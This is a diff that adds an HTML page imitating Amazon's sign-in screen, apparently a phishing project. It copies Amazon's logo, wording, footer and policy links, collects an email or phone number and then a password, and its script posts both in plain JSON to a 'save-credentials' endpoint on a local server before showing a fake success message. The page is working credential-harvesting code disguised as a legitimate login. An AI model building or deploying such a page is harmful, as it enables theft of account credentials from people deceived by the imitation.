@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Amazon</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
+    rel="stylesheet"
+  />
+  <link rel="icon" type="image/png" href="Amazon-logo2.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #202124;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .logo-container {
+      text-align: center;
+      margin-bottom: 10px;
+      margin-top: -20px;
+    }
+
+    .login-container {
+      width: 350px;
+      padding: 30px 20px 25px;
+      margin-bottom: 580px;
+      border: 0.5px solid gray;
+      border-radius: 8px;
+      height: auto;
+    }
+
+    .heading {
+      margin-bottom: 24px;
+    }
+
+    .heading h1 {
+      font-size: 18px;
+      font-weight: 400;
+      color: black;
+      margin-bottom: 10px;
+      text-align: left;
+      margin-top: -15px;
+    }
+
+    .heading p {
+      font-size: 14px;
+      font-weight: 600;
+      color: black;
+      margin-bottom: -15px;
+      text-align: left;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 12px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      transition: border 0.2s;
+      box-shadow: 0 0 8px 2px rgba(26, 115, 232, 0.7);
+    }
+
+    .input-field:focus {
+      border: 2px solid #1a73e8;
+    }
+
+    .input-error {
+      border-color: #d93025;
+    }
+
+    .error-message {
+      color: #d93025;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 40px;
+    }
+
+    .next-button {
+      background-color: #f8bd19;
+      color: black;
+      border: none;
+      border-radius: 25px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      border: 1px solid #f8bd19;
+      width: 100%;
+      padding: 10px 0;
+      white-space: nowrap;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      margin-top: -30px;
+    }
+
+    .next-button:hover {
+      background-color: #f8bd19;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+    }
+
+    .policy {
+      margin-top: 12px;
+      text-align: left;
+      font-size: 14px;
+      color: black;
+    }
+
+    .policy a {
+      color: #2162a1;
+      text-decoration: none;
+    }
+
+    .policy a:hover {
+      text-decoration: underline;
+    }
+
+    .need-help {
+      margin-top: 10px;
+      text-align: left;
+      font-size: 12px;
+      color: #2162a1;
+    }
+
+    .need-help a {
+      color: #2162a1;
+      text-decoration: none;
+    }
+
+    .need-help a:hover {
+      text-decoration: underline;
+    }
+
+    .language-selector {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 10px;
+      font-size: 13px;
+      margin-bottom: 10px;
+    }
+
+    .language-dropdown {
+      border: none;
+      background: transparent;
+      color: #757575;
+      font-size: 13px;
+      margin-right: 10px;
+      outline: none;
+    }
+
+    .language-link {
+      color: #757575;
+      text-decoration: none;
+    }
+
+    .language-link:hover {
+      text-decoration: underline;
+    }
+
+    footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #757575;
+    }
+
+    @media (max-width: 600px) {
+      .login-container {
+        border: none;
+        max-width: 100%;
+        padding: 24px;
+      }
+
+      footer {
+        bottom: 5px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-container">
+    <!-- Replace the src with a valid URL or local path to your Amazon logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" width="100" height="30" />
+  </div>
+
+  <div class="login-container">
+    <div class="heading">
+      <h1>Sign in or create an account</h1>
+      <p>Enter Mobile Number or Email</p>
+    </div>
+
+    <form id="loginForm">
+      <div class="form-group" id="emailGroup">
+        <input
+          type="text"
+          id="email"
+          class="input-field"
+          placeholder="Email or Phone"
+          required
+          autocomplete="username"
+        />
+        <div id="emailError" class="error-message">
+          Please Enter a Valid Email or Phone Number
+        </div>
+      </div>
+
+      <div class="form-group" id="passwordGroup" style="display: none;">
+        <input
+          type="password"
+          id="password"
+          class="input-field"
+          placeholder="Enter your password"
+          autocomplete="current-password"
+          minlength="8"
+          required
+        />
+        <div id="passwordError" class="error-message">
+          Please Enter Your Password (at least 8 characters)
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="button" class="next-button" id="nextButton">Continue</button>
+      </div>
+
+      <div class="policy">
+        <p>
+          By Continuing, You Agree To Amazon's
+          <a
+            href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&nodeId=508088"
+            target="_blank"
+            rel="noopener noreferrer"
+            >Conditions of Use</a
+          >
+          and
+          <a
+            href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&nodeId=468496"
+            target="_blank"
+            rel="noopener noreferrer"
+            >Privacy Notice</a
+          >.
+        </p>
+      </div>
+
+      <div class="need-help">
+        <p>
+          <a
+            href="https://www.amazon.com/gp/help/customer/account-issues/ref=unified_claim_collection?ie=UTF8"
+            target="_blank"
+            rel="noopener noreferrer"
+            >Need Help?</a
+          >
+        </p>
+      </div>
+    </form>
+  </div>
+
+  <div class="language-selector">
+    <select class="language-dropdown" aria-label="Select language">
+      <option>English (United States)</option>
+      <option>العربية</option>
+      <option>Español</option>
+      <option>Français</option>
+    </select>
+    <a
+      href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&nodeId=508088"
+      class="language-link"
+      target="_blank"
+      rel="noopener noreferrer"
+      >Conditions of Use</a
+    >
+    <a
+      href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&nodeId=468496"
+      class="language-link"
+      target="_blank"
+      rel="noopener noreferrer"
+      >Privacy Notice</a
+    >
+    <a
+      href="https://www.amazon.com/help"
+      class="language-link"
+      target="_blank"
+      rel="noopener noreferrer"
+      >Help</a
+    >
+  </div>
+
+  <footer>
+    <p>© 1996–2025, Amazon.com, Inc. or its affiliates</p>
+  </footer>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+    });
+
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const passwordGroup = document.getElementById('passwordGroup');
+    const nextButton = document.getElementById('nextButton');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const emailGroup = document.getElementById('emailGroup');
+
+    let emailEntered = false;
+
+    function isValidEmailOrPhone(input) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex = /^\+?\d{10,15}$/;
+      return emailRegex.test(input) || phoneRegex.test(input);
+    }
+
+    nextButton.addEventListener('click', function () {
+      if (!emailEntered) {
+        const emailValue = emailInput.value.trim();
+        if (!emailValue || !isValidEmailOrPhone(emailValue)) {
+          emailInput.classList.add('input-error');
+          emailError.style.display = 'block';
+          return;
+        }
+        emailInput.classList.remove('input-error');
+        emailError.style.display = 'none';
+
+        // Hide email input, show password input
+        emailGroup.style.display = 'none';
+        passwordGroup.style.display = 'block';
+        emailEntered = true;
+        nextButton.textContent = 'Sign in';
+
+        passwordInput.focus();
+      } else {
+        const passwordValue = passwordInput.value.trim();
+        if (!passwordValue || passwordValue.length < 8) {
+          passwordInput.classList.add('input-error');
+          passwordError.style.display = 'block';
+          return;
+        }
+        passwordInput.classList.remove('input-error');
+        passwordError.style.display = 'none';
+
+        const emailValue = emailInput.value.trim();
+
+        // Send to backend server
+        fetch('http://localhost:3000/api/save-credentials', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ email: emailValue, password: passwordValue }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.success) {
+              alert('Login successful! Data sent to server.');
+              window.location.href = 'Amazon.html'; // Change if needed
+            } else {
+              alert('Failed to save data on server.');
+            }
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+            alert('Error sending data to server.');
+          });
+      }
+    });
+  </script>
+</body>
+</html>
